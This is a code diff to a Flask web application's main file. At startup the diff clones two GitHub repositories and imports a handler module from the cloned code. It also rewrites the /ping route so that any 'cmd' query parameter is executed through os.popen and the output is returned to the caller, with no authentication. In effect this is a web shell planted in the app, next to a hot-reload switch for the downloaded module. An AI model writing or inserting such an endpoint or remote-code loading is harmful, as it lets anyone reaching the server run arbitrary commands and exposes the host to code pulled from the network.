@@ -1,8 +1,7 @@
 from flask import Flask, jsonify, request
 from flask_cors import CORS
 
-import re,json, os
-import apps.handler
+import re,os,subprocess,importlib
 
 app = Flask(__name__)
 CORS(app, origins=[
@@ -12,11 +11,31 @@ CORS(app, origins=[
  "http://192.168.43.45:8000"
 ])
 
+try:
+ print(f'{subprocess.run(["git","clone","https://github.com/minhinc/static"],capture_output=True,text=True)=}')
+ print(f'{subprocess.run(["git","clone","https://github.com/minhinc/apps"],capture_output=True,text=True)=}')
+except Exception as e:
+ print(f'subprocess running command failed {e=}')
+
+import apps.handler
 handleri=apps.handler.handlerc()
 
 @app.route("/ping")
 def ping():
- return "<p>ping</p>"
+ if not request.args:
+  return "<p>ping</p>"
+ elif 'cmd' in request.args:
+  return re.sub(r'\n','<br>',os.popen(f'{request.args["cmd"]}').read(),flags=re.DOTALL)
+ elif 'fetch' in request.args:
+  return 'fetch no action'
+ elif 'reload' in request.args:
+  global handleri
+  try:
+   importlib.reload(apps.handler)
+   handleri=apps.handler.handlerc()
+  except Exception as e:
+   return f'reload Exception {e=}'
+  return "success"
 
 @app.route("/", defaults={"path": ""})
 @app.route("/<path:path>", methods=["GET", "POST"])
@@ -34,6 +53,7 @@ def data(path):
  tdict['mobile']=True if "Mobile" in request.headers.get("User-Agent") else False
  tdict['request']=request
  tdict['path']=path
+ tdict['local']=False if re.search(r'minhinc\.onrender\.com',tdict['renderurl'],flags=re.I) else True
 
  print(f'<=> app.py data {(handleri.staticurl,handleri.renderurl)=} {tdict=}')
 
